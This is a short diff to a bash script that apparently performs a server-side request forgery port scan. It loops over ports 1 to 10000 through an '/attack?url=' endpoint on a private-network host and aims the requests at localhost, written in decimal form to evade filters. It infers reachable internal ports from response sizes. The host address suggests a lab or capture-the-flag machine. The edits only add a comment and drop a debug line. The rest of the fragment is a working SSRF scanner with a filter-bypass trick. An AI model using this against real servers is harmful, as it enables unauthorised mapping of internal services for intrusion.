@@ -6,9 +6,8 @@ counter=0
 
 for i in {1..10000}; 
 	do 
-		echo "Working on Port ${i}"
+		echo "Working on Port ${i}" # Because i love to see some lines flowing over the screen
 		size=$(curl http://10.10.144.204:8000/attack?url=http://2130706433:${i} -w %{size_download} --silent --output /dev/null)
-		echo "${size}"
 		if [[ size -lt 1045 ]]
 		then
 			echo "Target ${i} seems reachable"
